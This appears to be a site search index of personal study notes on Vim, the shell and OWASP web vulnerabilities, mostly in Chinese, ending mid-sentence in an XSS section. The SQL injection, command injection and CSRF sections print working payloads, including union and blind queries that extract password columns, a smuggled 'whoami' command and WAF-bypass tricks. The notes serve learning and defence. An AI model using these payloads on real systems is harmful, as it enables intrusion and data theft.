of shell code. Often shell scripts will include their own function definitions.</li> </ul>"},{"location":"linux/shell/#job_control","title":"Job Control","text":"<p>Shell is using a UNIX communication mechanism called a signal to communicate information to the process When a process receives a signal it stops its execution, deals with the signal and potentially changes the flow of execution based on the information that the signal delivered. For this reason, signals are software interrupts.</p>"},{"location":"linux/vim/","title":"vim","text":""},{"location":"linux/vim/#vim","title":"Vim","text":""},{"location":"linux/vim/#philosophy","title":"Philosophy","text":"<ul> <li>Vim is a modal editor: it has different modes for inserting text vs manipulating text. </li> <li>Vim is programmable (with Vimscript and also other languages like Python)</li> <li>Vim's interface itself is a programming language: keystrokes (with mnemonic names) are commands, and these commands are composable. </li> <li>Vim avoids the use of the mouse</li> <li>Vim even avoids using the arrow keys</li> </ul>"},{"location":"linux/vim/#modal_editing","title":"Modal editing","text":"<ul> <li>Normal: for moving around a file and making edits</li> <li><code>&lt;ESC&gt;</code></li> <li>Insert: for inserting text</li> <li><code>i</code></li> <li>Replace: for replacing text</li> <li><code>R</code></li> <li>Visual for selecting blocks of text</li> <li>Visual mode\uff1a <code>v</code></li> <li>Visual Line mode: <code>V</code></li> <li>Visual Block mode: <code>^V</code></li> <li>Command-line: for running a command</li> <li><code>:</code></li> </ul>"},{"location":"linux/vim/#buffers_tabs_and_windows","title":"Buffers, tabs, and windows","text":"<p>Vim maintains a set of open files, called \"buffers\".  A Vim session has a number of tabs, each of which has a number of windows (split panes). Each window shows a single buffer.  A given buffer may be open in multiple windows, even within the same tab. (unlike other programs)</p>"},{"location":"linux/vim/#command_line","title":"Command Line","text":"<ul> <li><code>:q</code> quit (close window)</li> <li><code>:w</code> save (\"write\")</li> <li><code>:wq</code> save and quit</li> <li><code>:e {name of file}</code> open file for editing</li> <li><code>:ls</code> show open buffers</li> <li><code>:help {topic}</code> open help<ul> <li><code>:help :w</code> opens help for the <code>:w</code> command</li> <li><code>:help w</code> opens help for the <code>w</code> movement</li> </ul> </li> </ul>"},{"location":"linux/vim/#vims_interface_is_a_programming_language","title":"Vim's interface is a programming language","text":""},{"location":"linux/vim/#movement","title":"Movement","text":"<p>Normal Mode</p> <p>Movements in Vim are also called \"nouns\", because they refer to chunks of text.</p> <ul> <li>Basic movement: <code>hjkl</code> (left, down, up, right)</li> <li>Words: <code>w</code> (next word), <code>b</code> (beginning of word), <code>e</code> (end of word)</li> <li>Lines: <code>0</code> (beginning of line), <code>^</code> (first non-blank character), <code>$</code> (end of line)</li> <li>Screen: <code>H</code> (top of screen), <code>M</code> (middle of screen), <code>L</code> (bottom of screen)</li> <li>Scroll: <code>Ctrl-u</code> (up), <code>Ctrl-d</code> (down)</li> <li>File: <code>gg</code> (beginning of file), <code>G</code> (end of file)</li> <li>Line numbers: <code>:{number}&lt;CR&gt;</code> or <code>{number}G</code> </li> <li>Misc: <code>%</code> (corresponding item)</li> <li>Find: <code>f{character}</code>, <code>t{character}</code>, <code>F{character}</code>, <code>T{character}</code><ul> <li>find/to forward/backward {character} on the current line</li> <li><code>,</code> / <code>;</code> for navigating matches</li> </ul> </li> <li>Search: <code>/{regex}</code>, <code>n</code> / <code>N</code> for navigating matches</li> </ul>"},{"location":"linux/vim/#selection","title":"Selection","text":"<p>Visual Mode - Visual mode\uff1a <code>v</code> - Visual Line mode: <code>V</code> - Visual Block mode: <code>^V</code></p> <p>Can use movement keys to make selection.</p>"},{"location":"linux/vim/#edit","title":"Edit","text":"<p>Vim's editing commands are also called \"verbs\", because verbs act on nouns. - <code>i</code> enter Insert mode     - but for manipulating/deleting text, want to use something more than     backspace - <code>o</code> / <code>O</code> insert line below / above - <code>d{motion}</code> delete {motion}     - e.g. <code>dw</code> is delete word, <code>d$</code> is delete to end of line, <code>d0</code> is delete     to beginning of line - <code>c{motion}</code> change {motion}     - e.g. <code>cw</code> is change word     - like <code>d{motion}</code> followed by <code>i</code> - <code>x</code> delete character (equal to <code>dl</code>) - <code>s</code> substitute character (equal to <code>cl</code>) - Visual mode + manipulation     - select text, <code>d</code> to delete it or <code>c</code> to change it - <code>u</code> to undo, <code>&lt;C-r&gt;</code> to redo - <code>y</code> to copy / \"yank\" (some other commands like <code>d</code> also copy) - <code>p</code> to paste - Lots more to learn: e.g. <code>~</code> flips the case of a character</p>"},{"location":"linux/vim/#count","title":"Count","text":"<ul> <li><code>5j</code> move 5 lines down</li> <li><code>7dw</code> delete 7 words</li> <li><code>c2w</code> change 2 words</li> </ul>"},{"location":"linux/vim/#modifiers","title":"Modifiers","text":"<ul> <li><code>i</code>: in</li> <li><code>a</code>: around</li> </ul> <p>examples:</p> <ul> <li><code>ci(</code> change the contents inside the current pair of parentheses</li> <li><code>ci[</code> change the contents inside the current pair of square brackets</li> <li><code>da'</code> delete a single-quoted string, including the surrounding single quotes</li> </ul>"},{"location":"linux/vim/#customizing_vim","title":"Customizing Vim","text":""},{"location":"owasp/File%20Inclusion/","title":"File Inclusion","text":""},{"location":"owasp/File%20Inclusion/#file_inclusion","title":"File Inclusion","text":""},{"location":"owasp/File%20Inclusion/#_1","title":"\u6587\u4ef6\u5305\u542b","text":"<p>PHP\u4e3a\u4e86\u63d0\u9ad8\u4ee3\u7801\u590d\u7528\u6027\uff0c\u63d0\u4f9b\u4e86\u6587\u4ef6\u5305\u542b\u51fd\u6570 include() , require(), require_once()\u548cinclude_once()\uff0c\u88ab\u5305\u542b\u7684\u6587\u4ef6\u5185\u5bb9\u4f1a\u88ab\u5f53\u505a\u4ee3\u7801\u6765\u6267\u884c\uff1b\u5373\u628a\u91cd\u590d\u4f7f\u7528\u7684\u4e00\u6bb5\u4ee3\u7801\uff0c\u5355\u72ec\u5199\u5230\u4e00\u4e2a\u6587\u4ef6\u91cc\uff0c\u518d\u7528\u6587\u4ef6\u5305\u542b\u51fd\u6570\u6765\u5305\u542b\u8fd9\u4e2a\u6587\u4ef6\uff1b \u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff1a\u4e3a\u4e86\u7075\u6d3b\u7684\u5305\u542b\u6587\u4ef6\uff0c\u4e00\u4e9b\u7a0b\u5e8f\u5458\u4f1a\u628a\u6587\u4ef6\u540d\u901a\u8fc7\u53c2\u6570\u7684\u5f62\u5f0f\u4f20\u9012\u7ed9\u6587\u4ef6\u5305\u542b\u51fd\u6570\u3002\u5f53\u4f20\u9012\u6587\u4ef6\u540d\u7684\u53c2\u6570\u88ab\u7528\u6237\u4fee\u6539\u65f6\uff0c\u7528\u6237\u5c31\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u6587\u4ef6\uff0c\u800c\u6587\u4ef6\u4e2d\u7684\u4ee3\u7801\u5c31\u4f1a\u88ab\u670d\u52a1\u5668\u6267\u884c\uff0c\u8fd9\u5c31\u9020\u6210\u4e86\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e</p>"},{"location":"owasp/File%20Inclusion/#_2","title":"\u6587\u4ef6\u5305\u542b\u51fd\u6570","text":"<p>PHP\u63d0\u4f9b\u4e86\u56db\u4e2a\u6587\u4ef6\u5305\u542b\u51fd\u6570\uff1a 1\uff09include() \uff1a\u5f53\u88ab\u5305\u542b\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u62a5\u9519\uff08Error\uff09\uff0c\u540e\u9762\u7684\u4ee3\u7801\u4e0d\u88ab\u6267\u884c\uff1b 2\uff09 include_once() \uff1a\u53ea\u5305\u542b\u4e00\u6b21\uff0c\u5305\u542b\u8fc7\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u91cd\u590d\u5305\u542b\uff1b 3\uff09 require() \uff1a\u5f53\u88ab\u5305\u542b\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\u65f6\uff0c\u4f1a\u544a\u8b66\uff08Wrainng\uff09\uff0c\u540e\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\uff1b 4\uff09require_once()\uff1a\u53ea\u5305\u542b\u4e00\u6b21\uff0c\u5305\u542b\u8fc7\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u91cd\u590d\u5305\u542b\u3002 \u6587\u4ef6\u5305\u542b\u51fd\u6570\u4e0d\u5173\u5fc3\u6587\u4ef6\u7684\u540e\u7f00\u540d\uff0c\u5b83\u53ea\u662f\u7b80\u5355\u7684\u6267\u884c\u88ab\u5305\u542b\u7684\u6587\u4ef6\uff0c\u5982\u679c\u6587\u4ef6\u7684\u5185\u5bb9\u662f\u4ee3\u7801\uff0c\u5c31\u4f1a\u6267\u884c\u4ee3\u7801\uff1b\u5982\u679c\u4e0d\u662f\u4ee3\u7801\uff0c\u5c31\u5f53\u505a\u6587\u672c\u8f93\u51fa\u5230\u9875\u9762\uff1b</p> <pre><code>&lt;?php\n\n// The page we wish to display\n$file = $_GET[ 'page' ];\n\n?&gt;\n</code></pre>"},{"location":"owasp/File%20Inclusion/#_3","title":"\u672c\u5730\u6587\u4ef6\u5305\u542b","text":"<p>\u5305\u542b\u670d\u52a1\u5668\u672c\u5730\u7684\u6587\u4ef6\u3002</p> <p>\u672c\u5730\u6587\u4ef6\u5305\u542b\u7684payload\u901a\u5e38\u4ee5\u6839\u76ee\u5f55\uff08/\uff09\u6216\u6587\u4ef6\u540d\u5f00\u5934\u3002\u4e5f\u5c31\u662f\u7edd\u5bf9\u8def\u5f84\u548c\u76f8\u5bf9\u8def\u5f84\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u5f00\u542ffopen\uff08allow_url_fopen=On\uff09 \u7528\u6237\u53ef\u63a7\u53c2\u6570\uff0c\u540e\u53f0\u672a\u8fc7\u6ee4\u5305\u542b\u7684\u6587\u4ef6\u3002</p>"},{"location":"owasp/File%20Inclusion/#_4","title":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b","text":"<p>\u5305\u542b\u8fdc\u7aef\u7684\u6587\u4ef6\u3002</p> <p>\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u7684payload\u901a\u5e38\u4ee5 http:// \u6216 ftp:// \u5f00\u5934\u3002</p> <p>\u5229\u7528\u6761\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u5f00\u542f fopen \u548c include\uff08allow_url_include=On\uff09 \u7528\u6237\u53c2\u6570\u53ef\u63a7\uff0c\u4e14\u540e\u53f0\u6ca1\u6709\u8fc7\u6ee4\u5305\u542b\u7684\u6587\u4ef6\u3002</p>"},{"location":"owasp/File%20Upload/","title":"File Upload","text":""},{"location":"owasp/File%20Upload/#file_upload","title":"File Upload  <p>File Upload\uff0c\u5373\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u901a\u5e38\u662f\u7531\u4e8e\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u7c7b\u578b\u3001\u5185\u5bb9\u6ca1\u6709\u8fdb\u884c\u4e25\u683c\u7684\u8fc7\u6ee4\u3001\u68c0\u67e5\uff0c\u4f7f\u5f97\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0a\u4f20\u6728\u9a6c\u83b7\u53d6\u670d\u52a1\u5668\u7684webshell\u6743\u9650</p>","text":""},{"location":"owasp/command%20injecttion/","title":"Command injecttion","text":""},{"location":"owasp/command%20injecttion/#command_injection","title":"Command Injection","text":"<p><pre><code>if( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n        // Windows\n        $cmd = shell_exec( 'ping  ' . $target );\n    }\n    else {\n        // *nix\n        $cmd = shell_exec( 'ping  -c 4 ' . $target );\n    }\n</code></pre> payload: <pre><code>127.0.0.1|whoami\n</code></pre> impossible: <pre><code>if( stristr( php_uname( 's' ), 'Windows NT' ) ) {\n        // Windows\n        $cmd = shell_exec( 'ping  ' . $target );\n    }\n    else {\n        // *nix\n        $cmd = shell_exec( 'ping  -c 4 ' . $target );\n    }\n</code></pre></p>"},{"location":"owasp/csrf/","title":"CSRF","text":""},{"location":"owasp/csrf/#csrf_--_cross_site_request_forgery","title":"CSRF -- Cross Site Request Forgery","text":""},{"location":"owasp/csrf/#cookie_and_session_management","title":"Cookie and Session Management","text":""},{"location":"owasp/csrf/#cookie_attributes","title":"Cookie Attributes","text":"<p>Every cookie is a name-value pair <pre><code>Set-Cookie: sessionid=abc123; Domain=example.com\n</code></pre> These additional cookie attributes help the browser determine which cookies should be attached to each request. - The Domain and Path attributes tell the browser which URLs to send the cookie to. See the next section for more details. - The Secure attribute tells the browser to only send the cookie over a secure HTTPS connection. - The HttpOnly attribute prevents JavaScript from accessing and modifying the cookie. - The expires field tells the browser when to stop remembering the cookie.</p>"},{"location":"owasp/csrf/#session","title":"Session","text":"<p>\u670d\u52a1\u5668\u7aef\u200b\u200b\u7ef4\u62a4\u7684\u7528\u6237\u72b6\u6001\u4fe1\u606f</p>"},{"location":"owasp/csrf/#session_management","title":"Session Management","text":"<p>Cookies are often used to keep users logged in to a website over many requests and responses.  When a user sends a login request with a valid username and password, the server will generate a new session token and send it to the user as a cookie. In future requests, the browser will attach the session token cookie and send it to the server. The server maintains a mapping of session tokens to users, so when it receives a request with a session token cookie, it can look up the corresponding user and customize its response accordingly.</p> <ul> <li>Session tokens are the values that the browser sends to the server to associate the request with a logged-in user. </li> <li>Cookies are how the browser stores and sends session tokens to the server. Cookies can also be used to save other state (attributes). </li> </ul>"},{"location":"owasp/csrf/#csrf","title":"CSRF","text":"<p>In a cross-site request forgery (CSRF) attack, the attacker forces the victim to make an unintended request. The victim\u2019s browser will automatically attach the session token cookie to the unintended request, and the server will accept the request as coming from the victim.</p>"},{"location":"owasp/csrf/#html_csrf","title":"HTML CSRF","text":"<p>\u5229\u7528 html \u5143\u7d20\u53d1\u9001 GET \u8bf7\u6c42 <pre><code>&lt;link href=\"\"&gt;\n&lt;img src=\"\"&gt;\n&lt;img lowsrc=\"\"&gt;\n&lt;img dynsrc=\"\"&gt;\n&lt;meta http-equiv=\"refresh\" content=\"0; url=\"&gt;\n&lt;iframe src=\"\"&gt;\n&lt;frame src=\"\"&gt;\n&lt;script src=\"\"&gt;&lt;/script&gt;\n&lt;bgsound src=\"\"&gt;&lt;/bgsound&gt;\n&lt;embed src=\"\"&gt;&lt;/bgsound&gt;\n&lt;video src=\"\"&gt;&lt;/video&gt;\n&lt;audio src=\"\"&gt;&lt;/audio&gt;\n&lt;a href=\"\"&gt;&lt;/a&gt;\n&lt;table background=\"\"&gt;&lt;/table&gt;\n......\n</code></pre> <pre><code>&lt;img src=\"https://bank.com/transfer?amount=100&amp;recipient=mallory\" /&gt;\n</code></pre></p> <p>POST \u8868\u5355 <pre><code>&lt;form action=\"http://www.a.com/register\" id=\"register\" method=\"post\"&gt;\n  &lt;input type=text name=\"username\" value=\"\" /&gt;\n  &lt;input type=password name=\"password\" value=\"\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;\n  var f = document.getElementById(\"register\");\n  f.inputs[0].value = \"test\";\n  f.inputs[1].value = \"passwd\";\n  f.submit();\n&lt;/script&gt;\n</code></pre></p> <p>CSS  <pre><code>@import \"\"\nbackground:url(\"\")\n......\n</code></pre></p>"},{"location":"owasp/csrf/#_1","title":"\u9632\u5fa1","text":"<p>\u9a8c\u8bc1\u7801 \u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002</p> <p>Referer Check \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002</p> <p>CSRF Token  When a legitimate user loads a webpage from the server with a form, the server will randomly generate a CSRF token and include it as an extra field in the form. When the user submits the form, the form will include the CSRF token, and the server will check that the CSRF token is valid. - \u968f\u673a\u6027 - \u751f\u547d\u5468\u671f\u77ed - \u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002</p>"},{"location":"owasp/sql%20injection/","title":"SQL Injection","text":""},{"location":"owasp/sql%20injection/#sql_injection","title":"SQL Injection  <p>\u6839\u636e\u7f51\u7ad9\u529f\u80fd\uff0c\u731c\u6d4b\u53ef\u80fd\u7684SQL\u8bed\u53e5 SELECT col_name(\u2026) FROM table_name WHERE id = {}       /\u6570\u5b57\u578b/ SELECT col_name(\u2026) FROM table_name WHERE id = '{}'     /\u5b57\u7b26\u578b/</p>","text":""},{"location":"owasp/sql%20injection/#_1","title":"\u5224\u65ad\u6570\u5b57\u578b / \u5b57\u7b26\u578b","text":"<ol> <li>\u4f20\u5165id=1: \u6b63\u5e38\u9875\u9762</li> <li>\u518d\u4f20\u5165id=2-1 </li> <li> <p>\u5982\u679c\u662f\u6570\u5b57\u578b\uff0c\u8bed\u53e5\u5e94\u8be5\u53d8\u4e3a\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = 2-1 \n</code></pre> \u7b49\u4ef7\u4e8e\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = 1 \n</code></pre> \u90a3\u4e48\u5c31\u5e94\u8be5\u80fd\u6b63\u5e38\u8fd4\u56deid=1\u7684\u9875\u9762</p> </li> <li> <p>\u5982\u679c\u662f\u5b57\u7b26\u578b\uff0c\u8bed\u53e5\u5e94\u8be5\u53d8\u4e3a\uff1a <pre><code>SELECT col_name(\u2026) FROM table_name WHERE id = '2-1'\n</code></pre> \u4f1a\u56e0\u4e3a\u67e5\u8be2\u4e0d\u5230\u5185\u5bb9</p> </li> </ol>"},{"location":"owasp/sql%20injection/#-","title":"\u5b57\u7b26\u578b -&gt; \u5224\u65ad\u5f15\u53f7\u7c7b\u578b","text":"<p>\u6709\u62a5\u9519\u56de\u663e | payload  |  \u5355\u5f15\u53f7 |\u53cc\u5f15\u53f7| |---|---|---| |  id=' |  ''' \u62a5\u9519 |\"'\"| |  id=\"  |  '\"' |\"\"\" \u62a5\u9519|</p> <p>\u65e0\u62a5\u9519\u56de\u663e |  payload | \u5355\u5f15\u53f7  |\u53cc\u5f15\u53f7| |---|---|---| |  id=adm''in | user found  |not found|</p>"},{"location":"owasp/sql%20injection/#_2","title":"\u6709\u56de\u663e","text":"<p>UNION SELECT</p> <p>\u8054\u5408\u67e5\u8be2\u524d\u540e\u7684\u5217\u6570\u5fc5\u987b\u4e00\u81f4\uff0c\u9700\u8981\u5224\u65ad\u539fSQL\u67e5\u8be2\u7684\u5217\u6570 <pre><code>id=1' ORDER BY M#\nid=1' UNION SELECT 1, 2,...#\n</code></pre> \u83b7\u53d6\u57fa\u672c\u4fe1\u606f <pre><code>id=' UNION SELECT DATABASE(), USER(),...\n</code></pre> \u83b7\u53d6\u66f4\u591a\u4fe1\u606f</p> <p>\u5728MySQL\u4e2d\uff0c\u6240\u6709\u7684\u6570\u636e\u5e93\u540d\u5b58\u653e\u5728information_schema.schemata\u7684schema_name\u5b57\u6bb5\u4e0b <pre><code>SELECT schema_name FROM information_schema.schemata;\n</code></pre> \u6240\u6709\u7684\u8868\u540d\u5b58\u653e\u5728information_schema.tables\u7684table_name\u5b57\u6bb5\u4e0b\uff0c\u53ef\u4ee5\u4ee5table_schema\u4e3a\u6761\u4ef6\u7b5b\u9009 <pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';\n</code></pre> \u6240\u6709\u7684\u5217\u540d\u5b58\u653e\u5728information_schema.columns\u7684column_name\u5b57\u6bb5\u4e0b\uff0c\u53ef\u4ee5\u4ee5table_schema\u548ctable_name\u4e3a\u6761\u4ef6\u7b5b\u9009 <pre><code>SELECT column_name FROM information_schema.columns WHERE table_name='table_name' \nAND table_schema='db_name';\n</code></pre></p> <p>pyaload eg. <pre><code>id = 4 UNION SELECT group_concat(schema_name), 2, 3 FROM information_schema.schemata\n</code></pre></p> <p>\u83b7\u53d6\u5230\u8868\u3001\u5217\u540d\u540e\uff0c\u53ef\u4ee5\u83b7\u53d6\u5176\u4ed6\u6570\u636e eg. users\u8868\u4e2d\u7684passwd\u5b57\u6bb5 - group_concat() \u5408\u5e76\u8bfb\u53d6 <pre><code>id = 4 UNION SELECT group_concat(passwd), 2, 3 FROM users;\n</code></pre> - LIMIT\u5206\u884c\u8bfb\u53d6 <pre><code>id = 4 UNION SELECT passwd, 2, 3 FROM users LIMIT 0, 1;\n</code></pre></p>"},{"location":"owasp/sql%20injection/#_3","title":"\u65e0\u56de\u663e","text":"<p>\u5e03\u5c14\u76f2\u6ce8 - <code>and</code> / <code>&amp;&amp;</code> - \u524d\u9762\u662f\u6709\u6548id\u65f6 - <code>or</code> / <code>||</code> - \u524d\u9762\u662f\u65e0\u6548id\u65f6</p> <p>\u7528SUBSTR()\u4e00\u4f4d\u4f4d\u53d6\u51fa\u8981\u67e5\u627e\u5185\u5bb9\u7684\u5b57\u7b26\uff0c\u518d\u7528ASCII()\u8f6c\u5316\u4e3aASCII\u7801\uff0c\u5c31\u80fd\u7528\u4e8c\u5206\u6cd5\u83b7\u53d6\u6570\u636e - SUBSTR(str, pos, len) - ASCII(char) <pre><code>name=a' or ASCII(SUBSTR((SELECT GROUP_CONCAT(passwd) FROM users), 1, 1))&gt;0#\n</code></pre></p> <p>\u5ef6\u65f6\u6ce8\u5165 - IF(condition, expr1, expr2) - SLEEP() <pre><code>name=admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))&gt;0, SLEEP(0), SLEEP(2))\n</code></pre></p> <p>\u62a5\u9519\u6ce8\u5165 <pre><code>name=admin' AND extractvalue(1, concat(0x7e, (SELECT ...), 0x7e)) -- - \nname=admin' AND updatexml(1,concat(0x7e,(SELECT ...),0x7e),1)-- -\n</code></pre></p> <p>\u5806\u53e0\u6ce8\u5165 \u5f88\u591a\u6570\u636e\u5e93\u662f\u652f\u6301\u591a\u4e2aSQL\u6307\u4ee4\u5728\u4e00\u884c\u5185\u6267\u884c\u7684,\u4f46\u670d\u52a1\u7aef\u8bed\u8a00\u53ef\u80fd\u4e0d\u4f1a\u83b7\u53d6\u591a\u884c\u7ed3\u679c</p> <p>\u5e38\u89c1\u5224\u65ad\u65b9\u6cd5\uff1a <pre><code>;select sleep(1);#\n</code></pre></p> <p>\u4e8c\u6b21\u6ce8\u5165 \u653b\u51fb\u8005\u5148\u5c06\u6076\u610f\u6570\u636e\u5b58\u5165\u6570\u636e\u5e93\uff0c\u4e4b\u540e\u5f53\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8fd9\u4e9b\u6570\u636e\u65f6\u89e6\u53d1\u6ce8\u5165</p>"},{"location":"owasp/sql%20injection/#_4","title":"\u9632\u62a4 &amp; \u7ed5\u8fc7","text":""},{"location":"owasp/sql%20injection/#_5","title":"\u9632\u62a4","text":"<ul> <li>\u76f4\u63a5\u62e6\u622a</li> <li>\u5173\u952e\u5b57\u66ff\u6362</li> <li>\u7f16\u7801\u8f6c\u4e49</li> <li>\u53c2\u6570\u5316\u67e5\u8be2</li> </ul>"},{"location":"owasp/sql%20injection/#_6","title":"\u68c0\u6d4b","text":"<ul> <li>\u5173\u952e\u5b57\u5339\u914d(\u76f4\u63a5\u67e5\u627e/\u6b63\u5219)</li> <li>\u8bed\u4e49\u5339\u914d</li> </ul>"},{"location":"owasp/sql%20injection/#_7","title":"\u7ed5\u8fc7","text":"<p>\u9488\u5bf9\u5173\u952e\u5b57/\u6b63\u5219\u5339\u914d - \u5927\u5c0f\u5199 - \u5229\u7528\u7b49\u4ef7\u547d\u4ee4 \u6bd4\u5982 OR-&gt;||, SPACE-&gt;/**/, ORDER BY-&gt;GROUP BY \u2026 - \u5982\u679c\u53ea\u662f\u5355\u7eaf\u5220\u53bb\u5173\u952e\u5b57\uff0c\u4e14\u53ea\u5220\u4e00\u6b21\uff0c\u53ef\u4ee5\u5d4c\u5957\u7ed5\u8fc7\uff0c\u6bd4\u5982UNION\u662f\u5173\u952e\u5b57\u4f1a\u88ab\u5220\u9664\uff0c \u90a3\u4e48\u4f20\u5165UNUNIONION\u5c31\u4f1a\u88ab\u5220\u6210UNION\uff0c\u4ece\u800c\u6ce8\u5165 - \u7ed5\u8fc7\u5f15\u53f7 <pre><code>-- hex \u7f16\u7801\nSELECT * FROM Users WHERE username = 0x61646D696E\n-- char() \u51fd\u6570\nSELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)\n</code></pre> \u5bbd\u5b57\u8282\u6ce8\u5165\uff1a \u5982\u679c\u6570\u636e\u5e93\u4f7f\u7528\u7684\u662fGBK\u7f16\u7801\uff0c\u800c\u670d\u52a1\u7aef\u53ea\u91c7\u7528addslashes()\u65b9\u6cd5\u8fdb\u884c\u8f6c\u4e49\uff0c\u53ef\u80fd\u9020\u6210\u9003\u9038\u3002\u6bd4\u5982addslashes(\"%df'\")=\"%df\\'\" \u4f20\u7ed9SQL\u670d\u52a1\u5668\u65f6\u5341\u516d\u8fdb\u5236\u7f16\u7801\u4e3a df 5c 27 \u800c\u5728GBK\u7f16\u7801\u4e0b\uff0cdf 5c\u662f\u6c49\u5b57\u904b\u7684\u7f16\u7801\uff0c\u6700\u540e\u8fd9\u6bb5\u5b57\u7b26\u4f1a\u88ab\u6570\u636e\u5e93\u7406\u89e3\u4e3a\u904b'\uff0c\u5bfc\u81f4\u8f6c\u4e49\u5931\u6548\uff0c\u5355\u5f15\u53f7\u9003\u9038</p> <ul> <li>\u5b57\u7b26\u4e32\u62fc\u63a5 <pre><code>SELECT 'a' 'd' 'mi' 'n';\nSELECT CONCAT('a', 'd', 'm', 'i', 'n');\nSELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');\nSELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');\n</code></pre></li> </ul> <p>\u9488\u5bf9\u8bed\u4e49\u5339\u914d \u76f8\u5bf9\u96be\u5ea6\u8f83\u5927\uff0c\u53ea\u80fd\u5229\u7528\u8bed\u8a00\u7279\u6027\u628a\u8bed\u4e49\u68c0\u6d4b\u7ed5\u6655\u3002\u5e38\u89c1\u529e\u6cd5\u662f\u5d4c\u5957\u6ce8\u91ca\u7b26\u8ba9\u5176\u4ee5\u4e3a\u5168\u90e8\u5185 \u5bb9\u90fd\u88ab\u6ce8\u91ca\u4e86\u3002  e.g.  <pre><code>id = 1/*#*/union select 1, 2, 3\nid = 1 and \"/*\"=\"\" union select 1, 2, 3#*/\n</code></pre></p>"},{"location":"owasp/xss/","title":"XSS","text":""},{"location":"owasp/xss/#xss_--_cross-site_scripting","title":"XSS -- Cross-Site Scripting  <p>\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002</p>","text":""},{"location":"owasp/xss/#reflected_cross-site_scripting","title":"Reflected Cross-Site Scripting","text":"<p>\u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002</p> <ul> <li>\u670d\u52a1\u5668\uff1a\u7406\u89e3\u6210\u6570\u636e</li> <li>\u6d4f\u89c8\u5668\uff1a\u7406\u89e3\u6210\u4ee3\u7801</li> </ul> <p>e.g. \u670d\u52a1\u5668\u7aef\u4ee3\u7801 <pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { \n    // Feedback for end user \n    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; \n} \n?&gt;\n</code></pre> \u6784\u9020\u6076\u610furl 